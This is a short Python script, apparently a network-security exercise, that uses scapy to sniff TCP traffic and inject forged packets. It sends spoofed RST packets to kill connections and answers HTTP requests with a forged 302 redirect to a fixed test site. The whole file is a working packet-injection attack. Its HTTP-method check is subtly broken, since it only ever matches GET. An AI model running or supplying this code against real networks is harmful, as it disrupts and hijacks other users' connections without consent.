from scapy.all import *
from threading import Timer
import os

fakeData = 'HTTP/1.1 302 Found\r\nLocation: http://test.gilgil.net\n\n'

def isHttpRequest(data):
    headers = str(data).splitlines()
    method = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS']
    for name in method:
        if headers[0][0:len(name)] == name:
            return 1
        return 0


def send_backward_rst(pkt):
    fake = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) / IP(dst=pkt[IP].src, src=pkt[IP].dst) / TCP(
        dport=pkt[TCP].sport,
        sport=pkt[TCP].dport,
        flags="RA",
        seq=pkt[TCP].ack,
        ack=pkt[TCP].seq + (len(pkt[TCP].payload) if pkt.getlayer(Raw) else 1)
    )
    sendp(fake)


def send_fakepkt(pkt):
    fake = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) / IP(dst=pkt[IP].src, src=pkt[IP].dst) / TCP(
        dport=pkt[TCP].sport,
        sport=pkt[TCP].dport,
        flags="FA",
        seq=pkt[TCP].ack,
        ack=pkt[TCP].seq + len(pkt[TCP].payload)
    ) / fakeData
    sendp(fake)


def send_forward_rst(pkt):
    fake = Ether(src=pkt[Ether].src, dst=pkt[Ether].dst) / IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(
        dport=pkt[TCP].dport,
        sport=pkt[TCP].sport,
        flags="RA",
        seq=pkt[TCP].seq + (len(pkt[TCP].payload) if pkt.getlayer(Raw) else 0),
        ack=pkt[TCP].ack + (len(fakeData) if pkt.getlayer(Raw) else 0)
    )
    sendp(fake)


def attack(pkt):
    layer = pkt.payload
    if pkt[TCP].flags & 0x04 or pkt[TCP].flags & 0x01: return

    if pkt.getlayer(Raw) and isHttpRequest(layer.load):  # http
        print "[+]=========HTTP sending rst============"
        send_forward_rst(pkt)
        send_fakepkt(pkt)

    else:  # only tcp
        send_forward_rst(pkt)
        send_backward_rst(pkt)


def callback():
    print 'End'
    os._exit(1)


if __name__ == "__main__":
    t = Timer(30, callback)
    t.start()
    sniff(filter="tcp", prn=attack)
